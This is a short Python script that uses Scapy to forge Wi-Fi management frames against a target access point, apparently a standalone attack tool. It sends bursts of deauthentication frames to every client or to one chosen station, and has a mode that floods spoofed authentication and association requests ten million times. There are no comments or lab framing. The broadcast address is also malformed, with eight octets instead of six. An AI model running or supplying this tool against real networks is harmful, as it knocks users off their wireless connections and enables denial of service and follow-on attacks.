from scapy.all import Dot11,RadioTap,sendp,RandMAC,Dot11Deauth,Dot11Auth,Dot11AssoReq,Dot11Elt
import argparse
import time

def deauth_broadcast(iface: str, ap: str):
  # AP broadcast
  dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff:ff:ff", addr2=ap, addr3=ap)
  frame = RadioTap()/dot11/Dot11Deauth()
  sendp(frame, iface=iface, loop=10, inter=0.00100)

def deauth_station(iface: str, ap: str, station: str):
  '''
  # Station unicast
  dot11 = Dot11(addr1=ap, addr2=station, addr3=ap)
  frame = RadioTap()/dot11/Dot11Deauth()
  sendp(frame, iface=iface, loop=10, inter=0.00100)
  '''
  # AP unicast
  dot11 = Dot11(addr1=station, addr2=ap, addr3=ap)
  frame = RadioTap()/dot11/Dot11Deauth()
  sendp(frame, iface=iface, loop=10, inter=0.00100)
  
def auth(iface: str, ap: str, station: str):
  for i in range(10000000):
    dot11 = Dot11(addr1=ap, addr2=station, addr3=ap)
    frame = RadioTap()/dot11/Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
    sendp(frame, iface=iface, count=1,inter=0.00100)
    frame = RadioTap()/dot11/Dot11AssoReq(cap=0x1100, listen_interval=0x00a)/Dot11Elt(ID=0, info="MY_BSSID")
    time.sleep(1)
    sendp(frame, iface=iface, count=1,inter=0.00100)

if __name__ == "__main__":
  parser = argparse.ArgumentParser()    
  parser.add_argument("interface")
  parser.add_argument("ap",metavar="MAC")
  parser.add_argument("-s","--station", metavar="MAC",help='')
  parser.add_argument("-auth",action='store_true',help='')
  args = parser.parse_args()
  if args.auth:
    if args.interface and args.ap and args.station:
      auth(args.interface, args.ap, args.station)
    else:
      print('Please match the args format.')
  else:
    if args.interface and args.ap and args.station:
      deauth_station(args.interface, args.ap, args.station)
    elif args.interface and args.ap:
      deauth_broadcast(args.interface, args.ap)
    else:
      print('Please match the args format.')
